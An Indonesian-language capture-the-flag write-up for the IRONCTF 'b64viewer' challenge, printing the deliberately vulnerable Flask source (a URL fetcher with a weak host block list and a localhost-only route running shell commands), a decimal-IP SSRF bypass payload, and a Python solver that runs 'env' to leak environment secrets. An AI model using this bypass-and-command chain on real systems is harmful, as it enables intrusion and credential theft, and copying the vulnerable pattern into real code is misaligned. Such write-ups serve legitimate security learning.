# IRONCTF - b64viewer - Writeup
Pada challenge kali ini diberikan sebuah web app, yang mana melakukan fetch halaman yang kita inginkan dengan mengisi form, dan flag berada pada endpoint `/admin`, yang mana hanya bisa diakses oleh ip localhost

## Source Code
```python
from flask import render_template,render_template_string,Flask,request
from urllib.parse import urlparse
import urllib.request
import random
import os
import subprocess
import base64
app=Flask(__name__)
app.secret_key=os.urandom(16)

@app.route('/',methods=['GET','POST'])
def home():
    if request.method=='GET':
        return render_template('home.html')
    if request.method=='POST':
        try:
            url=request.form.get('url')
            scheme=urlparse(url).scheme
            hostname=urlparse(url).hostname
            blacklist_scheme=['file','gopher','php','ftp','dict','data']
            blacklist_hostname=['127.0.0.1','localhost','0.0.0.0','::1','::ffff:127.0.0.1']
            if scheme in blacklist_scheme:
                return render_template_string('blocked scheme')     
            if hostname in blacklist_hostname:
                return render_template_string('blocked host')
            t=urllib.request.urlopen(url)
            content = t.read()
            output=base64.b64encode(content)
            return (f'''base64 version of the site:
                {output[:1000]}''')
        except Exception as e:
                print(e)
                return f" An error occurred: {e} - Unable to visit this site, try some other website."


@app.route('/admin')
def admin():
    remote_addr = request.remote_addr
    
    if remote_addr in ['127.0.0.1', 'localhost']:
        cmd=request.args.get('cmd','id')
        cmd_blacklist=['REDACTED']
        if "'" in cmd or '"' in cmd:
            return render_template_string('Command blocked')
        for i in cmd_blacklist:
            if i in cmd:
                return render_template_string('Command blocked')
        print(f"Executing: {cmd}")
        res= subprocess.run(cmd, shell=True, capture_output=True, text=True)
        return res.stdout
    else:
        return render_template_string("Don't hack me")

if __name__=="__main__":
    app.run(host='0.0.0.0',port='5000')

```

untuk mendapatkan flag kita hanya cukup melakukan `SSRF` sederhana, dengan mengisi form url menjadi payload berikut.

```
http://2130706433:5000/admin
```
url akan menerjemahkan `2130706433` sebagai `127.0.0.1`, sehingga kita akan membuka path `/admin` denan ip localhost.

karena flag di letakan di env, kita tinggal menambahkan cmd=printenv, dan kita mendapatkan flag, berikut kode solver nya

## Solver Code
```python
import requests
import base64
import re

URL = 'http://localhost:5000/'

data = {'url':'http://2130706433:5000/admin?cmd=env'}
pattern = r"base64 version of the site:\s*b'([^']*)'"

req = requests.post(URL,data=data)
match = re.search(pattern,req.text)
if match:
	b64decode = base64.b64decode(match.group(1))
	print(b64decode.decode())
else:
	print(req.text)


```